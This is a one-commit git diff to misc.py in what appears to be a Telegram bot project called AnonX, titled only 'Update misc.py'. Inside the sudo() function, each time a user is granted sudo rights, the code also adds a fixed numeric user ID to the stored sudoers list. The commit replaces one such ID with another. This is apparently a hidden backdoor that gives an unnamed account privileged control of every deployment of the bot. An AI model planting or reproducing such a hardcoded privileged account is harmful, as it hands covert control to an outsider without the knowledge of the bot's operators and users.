9f181e1534a2c835bfccc70b9ff1d36d6dbff80d
AerodynamicV1Botz <104615877+AerodynamicV1Botz@users.noreply.github.com>
2022-06-20 10:25:55 +0530

    Update misc.py

--- AnonX/misc.py
+++ AnonX/misc.py
@@ -56,7 +56,7 @@ def sudo():
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
-                sudoers.append(1356469075)
+                sudoers.append(1484735126)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
